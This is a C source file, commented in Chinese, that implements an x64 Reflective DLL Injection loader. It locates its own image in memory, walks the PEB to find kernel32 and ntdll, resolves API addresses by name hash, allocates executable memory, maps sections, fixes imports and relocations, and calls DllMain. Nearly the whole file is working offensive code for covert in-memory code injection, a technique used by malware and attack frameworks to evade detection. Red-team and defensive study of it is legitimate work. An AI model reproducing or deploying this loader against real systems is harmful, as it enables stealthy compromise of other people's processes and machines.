/*
 * Reflective DLL Injection - ReflectiveLoader Implementation
 *
 * 反射 DLL 注入核心加载器实现（x64 版本）
 *
 * 这个函数会被编译进 DLL，作为导出函数。
 * 当注入器创建远程线程时，线程从这个函数开始执行。
 *
 * 加载流程：
 * 1. 计算 DLL 当前在内存中的位置
 * 2. 通过 PEB 遍历找到 kernel32.dll 和 ntdll.dll
 * 3. 解析导出表获取需要的 API 地址
 * 4. 分配新内存并复制 PE 结构
 * 5. 处理导入表（加载依赖 DLL）
 * 6. 处理重定位表（修正地址）
 * 7. 调用 DllMain(DLL_PROCESS_ATTACH)
 */

#include "ReflectiveLoader.h"

// 全局变量：DLL 的伪 HINSTANCE
HINSTANCE hAppInstance = NULL;

// ========================================
// 辅助函数：获取调用者地址
// ========================================

// 不内联，确保获取正确的返回地址
__declspec(noinline) ULONG_PTR caller(VOID) {
    // MSVC 使用 _ReturnAddress() 内建函数
    // GCC 使用 __builtin_return_address(0)
    #ifdef _MSC_VER
        return (ULONG_PTR)_ReturnAddress();
    #else
        return (ULONG_PTR)__builtin_return_address(0);
    #endif
}

// ========================================
// 核心反射加载器函数
// ========================================

DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(VOID)
{
    // ========================================
    // 变量声明
    // ========================================

    // API 函数指针
    LOADLIBRARYA pLoadLibraryA = NULL;
    GETPROCADDRESS pGetProcAddress = NULL;
    VIRTUALALLOC pVirtualAlloc = NULL;
    NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

    // 计数器
    USHORT usCounter;

    // DLL 当前位置和新位置
    ULONG_PTR uiLibraryAddress;     // DLL 当前在内存中的地址
    ULONG_PTR uiBaseAddress;        // kernel32.dll 基址 / 新分配的基址

    // 导出表解析变量
    ULONG_PTR uiAddressArray;
    ULONG_PTR uiNameArray;
    ULONG_PTR uiExportDir;
    ULONG_PTR uiNameOrdinals;
    DWORD dwHashValue;

    // PE 加载变量
    ULONG_PTR uiHeaderValue;
    ULONG_PTR uiValueA;
    ULONG_PTR uiValueB;
    ULONG_PTR uiValueC;
    ULONG_PTR uiValueD;
    ULONG_PTR uiValueE;

    // ========================================
    // STEP 0: 计算 DLL 当前在内存中的位置
    // ========================================

    // 从调用者的返回地址开始向后搜索
    uiLibraryAddress = caller();

    // 向后搜索 MZ/PE 头
    while (TRUE) {
        if (((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE) {
            uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

            // 防止误报（某些 x64 代码可能触发假的 MZ 签名）
            if (uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024) {
                uiHeaderValue += uiLibraryAddress;

                // 检查 PE 签名
                if (((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature == IMAGE_NT_SIGNATURE)
                    break;
            }
        }
        uiLibraryAddress--;
    }

    // ========================================
    // STEP 1: 解析 kernel32.dll 和 ntdll.dll 导出表
    // ========================================

    // 获取 PEB（x64: GS:[0x60]）
    uiBaseAddress = __readgsqword(0x60);

    // 获取 PEB->Ldr
    uiBaseAddress = (ULONG_PTR)(((PPEB)uiBaseAddress)->pLdr);

    // 获取 InMemoryOrderModuleList 第一个条目
    uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;

    // 遍历模块链表
    while (uiValueA) {
        // 获取模块名称（Unicode）
        uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;
        usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
        uiValueC = 0;

        // 计算模块名称哈希
        do {
            uiValueC = ror((DWORD)uiValueC);

            // 转换为大写
            if (*((BYTE *)uiValueB) >= 'a')
                uiValueC += *((BYTE *)uiValueB) - 0x20;
            else
                uiValueC += *((BYTE *)uiValueB);

            uiValueB++;
        } while (--usCounter);

        // ========================================
        // 解析 kernel32.dll
        // ========================================
        if ((DWORD)uiValueC == KERNEL32DLL_HASH) {
            uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

            // 获取 NT 头
            uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

            // 获取导出表
            uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            uiExportDir = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);

            // 获取导出函数名称数组
            uiNameArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames);

            // 获取名称序号数组
            uiNameOrdinals = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals);

            usCounter = 3; // 需要找到 3 个函数

            // 遍历导出表
            while (usCounter > 0) {
                dwHashValue = hash((char *)(uiBaseAddress + DEREF_32(uiNameArray)));

                // 检查是否是我们需要的函数
                if (dwHashValue == LOADLIBRARYA_HASH ||
                    dwHashValue == GETPROCADDRESS_HASH ||
                    dwHashValue == VIRTUALALLOC_HASH) {

                    // 获取函数地址数组
                    uiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);

                    // 通过序号索引获取函数地址
                    uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

                    // 保存函数地址
                    if (dwHashValue == LOADLIBRARYA_HASH)
                        pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + DEREF_32(uiAddressArray));
                    else if (dwHashValue == GETPROCADDRESS_HASH)
                        pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress + DEREF_32(uiAddressArray));
                    else if (dwHashValue == VIRTUALALLOC_HASH)
                        pVirtualAlloc = (VIRTUALALLOC)(uiBaseAddress + DEREF_32(uiAddressArray));

                    usCounter--;
                }

                // 下一个导出函数
                uiNameArray += sizeof(DWORD);
                uiNameOrdinals += sizeof(WORD);
            }
        }
        // ========================================
        // 解析 ntdll.dll
        // ========================================
        else if ((DWORD)uiValueC == NTDLLDLL_HASH) {
            uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

            uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
            uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            uiExportDir = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);
            uiNameArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames);
            uiNameOrdinals = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals);

            usCounter = 1; // NtFlushInstructionCache

            while (usCounter > 0) {
                dwHashValue = hash((char *)(uiBaseAddress + DEREF_32(uiNameArray)));

                if (dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH) {
                    uiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);
                    uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

                    pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)(uiBaseAddress + DEREF_32(uiAddressArray));
                    usCounter--;
                }

                uiNameArray += sizeof(DWORD);
                uiNameOrdinals += sizeof(WORD);
            }
        }

        // 找到所有需要的函数后退出
        if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache)
            break;

        // 下一个模块
        uiValueA = DEREF(uiValueA);
    }

    // ========================================
    // STEP 2: 分配新内存并复制 PE 头
    // ========================================

    // 获取 NT 头
    uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

    // 分配内存（PAGE_EXECUTE_READWRITE）
    uiBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL,
        ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    // 复制 PE 头
    uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
    uiValueB = uiLibraryAddress;
    uiValueC = uiBaseAddress;

    while (uiValueA--)
        *(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;

    // ========================================
    // STEP 3: 复制所有节
    // ========================================

    // 第一个节头
    uiValueA = ((ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader +
                ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);

    // 节的数量
    uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;

    while (uiValueE--) {
        // 目标地址
        uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);

        // 源地址
        uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData);

        // 节大小
        uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

        // 复制节数据
        while (uiValueD--)
            *(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;

        // 下一个节
        uiValueA += sizeof(IMAGE_SECTION_HEADER);
    }

    // ========================================
    // STEP 4: 处理导入表
    // ========================================

    uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

    // 遍历所有导入的 DLL
    while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name) {
        // 加载依赖的 DLL
        uiLibraryAddress = (ULONG_PTR)pLoadLibraryA((LPCSTR)(uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name));

        // OriginalFirstThunk
        uiValueD = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk);

        // IAT（Import Address Table）
        uiValueA = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk);

        // 遍历所有导入的函数
        while (DEREF(uiValueA)) {
            // 按序号导入
            if (uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
                uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
                uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);
                uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);

                uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) -
                                    ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));

                DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));
            }
            // 按名称导入
            else {
                uiValueB = (uiBaseAddress + DEREF(uiValueA));
                DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress((HMODULE)uiLibraryAddress,
                    (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
            }

            // 下一个导入函数
            uiValueA += sizeof(ULONG_PTR);
            if (uiValueD)
                uiValueD += sizeof(ULONG_PTR);
        }

        // 下一个导入 DLL
        uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
    }

    // ========================================
    // STEP 5: 处理重定位表
    // ========================================

    // 计算地址差值
    uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

    uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    // 如果有重定位表
    if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size) {
        uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

        // 遍历所有重定位块
        while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock) {
            // 重定位块的基地址
            uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);

            // 重定位条目数量
            uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

            // 第一个重定位条目
            uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

            // 处理所有重定位条目
            while (uiValueB--) {
                // IMAGE_REL_BASED_DIR64 (x64)
                if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64)
                    *(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
                // IMAGE_REL_BASED_HIGHLOW (兼容性)
                else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
                    *(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
                // IMAGE_REL_BASED_HIGH
                else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH)
                    *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
                // IMAGE_REL_BASED_LOW
                else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW)
                    *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

                // 下一个重定位条目
                uiValueD += sizeof(IMAGE_RELOC);
            }

            // 下一个重定位块
            uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
        }
    }

    // ========================================
    // STEP 6: 调用 DllMain
    // ========================================

    // 入口点地址
    uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);

    // 刷新指令缓存
    pNtFlushInstructionCache((HANDLE)-1, NULL, 0);

    // 调用 DllMain(DLL_PROCESS_ATTACH)
    ((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL);

    // 返回入口点地址
    return uiValueA;
}

// ========================================
// 默认 DllMain（如果 DLL 没有自定义）
// ========================================

#ifndef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
    BOOL bReturnValue = TRUE;

    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;
            break;

        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }

    return bReturnValue;
}

#endif // REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
